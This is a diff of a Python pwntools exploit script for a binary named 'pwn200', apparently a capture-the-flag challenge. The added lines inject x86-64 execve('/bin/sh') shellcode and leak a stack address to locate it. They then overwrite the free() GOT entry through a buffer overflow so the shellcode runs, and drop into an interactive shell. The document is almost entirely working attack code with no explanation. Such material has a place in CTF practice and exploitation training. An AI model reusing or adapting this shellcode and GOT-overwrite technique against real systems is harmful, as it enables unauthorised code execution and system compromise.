@@ -1,14 +1,28 @@
+#coding = utf8
 from pwn import *
 context(log_level="debug")
 
 p = process('./pwn200')
+elf = ELF('./pwn200')
+free_got = elf.got["free"]
+
 gdb.attach(p,"b*0x400A72\nc")
 p.recvuntil('u?\n')
-p.send("a"*48)
-p.recvuntil(' me your id ~~?\n')
+
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+p.send(shellcode+"a"*(48-len(shellcode)))
+
+ebp = u64(p.recvuntil(' me your id ~~?\n')[48:48+6].ljust(8,'\x00'))
+print "ebp = "+hex(ebp)
+offset = 0x00007fff401d62e0 - 0x00007fff401d6290
+shellcode_addr = ebp - offset
+print "shellcode_addr = " + hex(shellcode_addr)
 p.sendline('0')
+
 p.recvuntil('\n')
-p.send('a'*0x30)
+
+payload = p64(shellcode_addr)
+p.send(payload+'\x00'*(0x38-len(payload))+p64(free_got)) #the juck data must be '\x00' in the got!
 p.recvuntil('choice :')
-p.sendline('3')
+p.sendline('2')
 p.interactive()
